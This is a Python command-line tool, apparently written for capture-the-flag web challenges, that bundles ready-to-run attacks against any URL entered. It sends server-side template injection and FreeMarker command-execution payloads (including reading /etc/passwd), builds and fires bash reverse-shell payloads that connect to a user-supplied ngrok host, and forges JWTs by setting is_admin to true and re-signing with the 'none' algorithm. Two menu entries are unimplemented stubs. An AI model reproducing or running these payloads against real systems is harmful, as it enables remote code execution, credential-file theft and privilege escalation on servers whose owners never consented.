#!/usr/bin/env python3
import requests
import jwt
import json
import re


class CTFTOOL:
    def fetch_robots_txt(self, base_url):
        """Fetch and display the content of robots.txt file."""
        try:
            response = requests.get(f"{base_url}/robots.txt")
            if response.status_code == 200:
                print("[+] Found robots.txt:")
                print(response.text)
            else:
                print("[-] robots.txt not found.")
        except Exception as e:
            print(f"[-] Error fetching robots.txt: {e}")

    def extract_and_decode_cookies(self, url):
        """Extract cookies from a URL and decode them to JSON format."""
        try:
            response = requests.get(url)
            cookies = response.cookies
            if cookies:
                print("[+] Cookies found:")
                for cookie in cookies:
                    print(f"Name: {cookie.name}, Value: {cookie.value}")
                # Decode cookies to JSON
                decoded_cookies = {cookie.name: cookie.value for cookie in cookies}
                print("[+] Decoded cookies in JSON format:")
                print(json.dumps(decoded_cookies, indent=4))
            else:
                print("[-] No cookies found.")
        except Exception as e:
            print(f"[-] Error extracting cookies: {e}")

    def exploit_ssti(self, url, param_name):
        """
        Test and exploit Server-Side Template Injection (SSTI).
        :param url: The target URL.
        :param param_name: The parameter name to inject the payload into.
        """
        try:
            # Define SSTI payloads for testing
            test_payloads = [
                "{{7*7}}",  # Simple math test
                "{{ ''.__class__.__mro__[1].__subclasses__() }}",  # Explore subclasses
                "{{ config.items() }}"  # Access Flask config (if applicable)
            ]
            print("[+] Testing for SSTI vulnerability...")
            for payload in test_payloads:
                # Prepare the request with the payload
                params = {param_name: payload}
                response = requests.get(url, params=params)
                # Check if the payload was executed
                if "49" in response.text and payload == "{{7*7}}":
                    print("[+] Potential SSTI vulnerability detected!")
                    print(f"[+] Payload: {payload}")
                    print("[+] Response:")
                    print(response.text)
                    # Ask user if they want to create a reverse shell payload
                    create_payload = input("[?] Do you want to create a reverse shell payload? (y/n): ").strip().lower()
                    if create_payload == "y":
                        self.create_reverse_shell_payload(url, param_name)
                    return
            print("[-] No SSTI vulnerability detected.")
        except Exception as e:
            print(f"[-] Error testing SSTI: {e}")

    def create_reverse_shell_payload(self, url, param_name):
        """
        Create and send a reverse shell payload using SSTI.
        :param url: The target URL.
        :param param_name: The parameter name to inject the payload into.
        """
        try:
            # Get Ngrok IP and port from the user
            ngrok_ip = input("[+] Enter your Ngrok IP (e.g., 0.tcp.ngrok.io): ").strip()
            ngrok_port = input("[+] Enter your Ngrok port (e.g., 4444): ").strip()
            # Create the reverse shell payload
            payload = f"{{{{request.application.__globals__.__builtins__.__import__('os').popen('bash -c \"bash -i >& /dev/tcp/{ngrok_ip}/{ngrok_port} 0>&1\"').read()}}}}"
            print(f"[+] Generated payload: {payload}")
            # Send the payload to the target
            params = {param_name: payload}
            print("[+] Sending payload to the target...")
            response = requests.get(url, params=params)
            # Display the response
            print("[+] Response from the server:")
            print(response.text)
        except Exception as e:
            print(f"[-] Error creating or sending payload: {e}")

    def search_source_code(self, url):
        """
        Search the source code of a webpage for interesting keywords, comments, or patterns.
        :param url: The target URL.
        """
        try:
            print("[+] Fetching source code of the webpage...")
            response = requests.get(url)
            if response.status_code != 200:
                print(f"[-] Failed to fetch the webpage. Status code: {response.status_code}")
                return
            source_code = response.text
            print("[+] Analyzing source code...")
            # Keywords to search for
            keywords = ["flag", "secret", "key", "password", "token"]
            # Patterns to search for (e.g., base64, long numbers)
            patterns = {
                "Base64": r"[A-Za-z0-9+/=]{20,}",  # Base64 encoded strings
                "Numbers": r"\b\d{5,}\b",         # Long numbers (5+ digits)
                "Comments": r"<!--.*?-->"         # HTML comments
            }
            # Search for keywords
            print("[+] Searching for keywords...")
            for keyword in keywords:
                if keyword in source_code.lower():
                    print(f"[+] Found keyword: {keyword}")
            # Search for patterns
            print("[+] Searching for patterns...")
            for pattern_name, pattern in patterns.items():
                matches = re.findall(pattern, source_code)
                if matches:
                    print(f"[+] Found {pattern_name}:")
                    for match in matches:
                        print(f"    - {match}")
            print("[+] Source code analysis completed.")
        except Exception as e:
            print(f"[-] Error analyzing source code: {e}")

    def exploit_filter_chain_rce(self, url, param_name):
        """
        Exploit Filter Chain RCE vulnerabilities.
        :param url: The target URL.
        :param param_name: The parameter name to inject the payload into.
        """
        try:
            # Define common Filter Chain RCE payloads
            rce_payloads = [
                "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
                "${\"freemarker.template.utility.Execute\"?new()(\"whoami\")}",
                "${\"freemarker.template.utility.Execute\"?new()(\"ls -la\")}",
                "${\"freemarker.template.utility.Execute\"?new()(\"cat /etc/passwd\")}"
            ]
            print("[+] Testing for Filter Chain RCE vulnerability...")
            for payload in rce_payloads:
                # Prepare the request with the payload
                params = {param_name: payload}
                response = requests.get(url, params=params)
                # Check if the payload was executed
                if "uid=" in response.text or "root:" in response.text:
                    print("[+] Potential Filter Chain RCE vulnerability detected!")
                    print(f"[+] Payload: {payload}")
                    print("[+] Response:")
                    print(response.text)
                    # Ask user if they want to create a reverse shell payload
                    create_payload = input("[?] Do you want to create a reverse shell payload? (y/n): ").strip().lower()
                    if create_payload == "y":
                        self.create_reverse_shell_payload_for_filter_chain(url, param_name)
                    return
            print("[-] No Filter Chain RCE vulnerability detected.")
        except Exception as e:
            print(f"[-] Error testing Filter Chain RCE: {e}")

    def create_reverse_shell_payload_for_filter_chain(self, url, param_name):
        """
        Create and send a reverse shell payload for Filter Chain RCE.
        :param url: The target URL.
        :param param_name: The parameter name to inject the payload into.
        """
        try:
            # Get Ngrok IP and port from the user
            ngrok_ip = input("[+] Enter your Ngrok IP (e.g., 0.tcp.ngrok.io): ").strip()
            ngrok_port = input("[+] Enter your Ngrok port (e.g., 4444): ").strip()
            # Create the reverse shell payload
            payload = f"${{\"freemarker.template.utility.Execute\"?new()}}(\"bash -c \\\"bash -i >& /dev/tcp/{ngrok_ip}/{ngrok_port} 0>&1\\\"\")"
            print(f"[+] Generated payload: {payload}")
            # Send the payload to the target
            params = {param_name: payload}
            print("[+] Sending payload to the target...")
            response = requests.get(url, params=params)
            # Display the response
            print("[+] Response from the server:")
            print(response.text)
        except Exception as e:
            print(f"[-] Error creating or sending payload: {e}")

    def modify_jwt_token(self, token, secret_key=None):
        """
        Modify a JWT token by changing "is_admin" from false to true.
        :param token: The original JWT token.
        :param secret_key: The secret key used to sign the token (optional).
        """
        try:
            print("[+] Decoding the JWT token...")
            # Decode the token (without verifying the signature if no secret key is provided)
            payload = jwt.decode(token, options={"verify_signature": False})
            print("[+] Original payload:")
            print(payload)
            # Check if "is_admin" exists and is set to false
            if "is_admin" in payload and payload["is_admin"] is False:
                print("[+] Found 'is_admin' set to false. Modifying it to true...")
                payload["is_admin"] = True
                # Re-encode the token
                if secret_key:
                    print("[+] Re-encoding the token with the provided secret key...")
                    new_token = jwt.encode(payload, secret_key, algorithm="HS256")
                else:
                    print("[+] Re-encoding the token without signing (for testing purposes)...")
                    new_token = jwt.encode(payload, "", algorithm="none")
                print("[+] New token generated:")
                print(new_token)
                return new_token
            else:
                print("[-] 'is_admin' is not set to false or does not exist in the payload.")
                return None
        except Exception as e:
            print(f"[-] Error modifying JWT token: {e}")
            return None

    def test_modified_token(self, url, token):
        """
        Test the modified JWT token on a protected endpoint.
        :param url: The target URL.
        :param token: The modified JWT token.
        """
        try:
            headers = {"Authorization": f"Bearer {token}"}
            response = requests.get(url, headers=headers)
            print("[+] Response from the server:")
            print(response.text)
        except Exception as e:
            print(f"[-] Error testing modified token: {e}")


# Example usage
if __name__ == "__main__":
    print("\n=== Welcome to CTFTOOL Created By Marwan Clay ===\n")
    tool = CTFTOOL()
    while True:
        print("\n[1] Fetch robots.txt")
        print("[2] Extract and decode cookies")
        print("[3] Exploit SSTI")
        print("[4] Search source code")
        print("[5] Exploit LFI")
        print("[6] Check and download .git")
        print("[7] Exploit Filter Chain RCE")
        print("[8] Modify JWT Token")
        print("[9] Exit")
        choice = input("\nChoose an option: ").strip()
        if choice == "1":
            target_url = input("Enter the target URL (e.g., http://example.com): ").strip()
            tool.fetch_robots_txt(target_url)
        elif choice == "2":
            target_url = input("Enter the target URL (e.g., http://example.com): ").strip()
            tool.extract_and_decode_cookies(target_url)
        elif choice == "3":
            target_url = input("Enter the target URL (e.g., http://example.com/page): ").strip()
            param_name = input("Enter the parameter name to inject into (e.g., 'name'): ").strip()
            tool.exploit_ssti(target_url, param_name)
        elif choice == "4":
            target_url = input("Enter the target URL (e.g., http://example.com): ").strip()
            tool.search_source_code(target_url)
        elif choice == "5":
            print("[-] This feature is not implemented yet.")
        elif choice == "6":
            print("[-] This feature is not implemented yet.")
        elif choice == "7":
            target_url = input("Enter the target URL (e.g., http://example.com/page): ").strip()
            param_name = input("Enter the parameter name to inject into (e.g., 'input'): ").strip()
            tool.exploit_filter_chain_rce(target_url, param_name)
        elif choice == "8":
            token = input("[+] Enter the JWT token: ").strip()
            secret_key = input("[+] Enter the secret key (leave blank if unknown): ").strip() or None
            new_token = tool.modify_jwt_token(token, secret_key)
            if new_token:
                target_url = input("[+] Enter the target URL to test the token (e.g., http://example.com/protected): ").strip()
                tool.test_modified_token(target_url, new_token)
        elif choice == "9":
            print("[+] Exiting...\n")
            break
        else:
            print("[-] Invalid choice.")
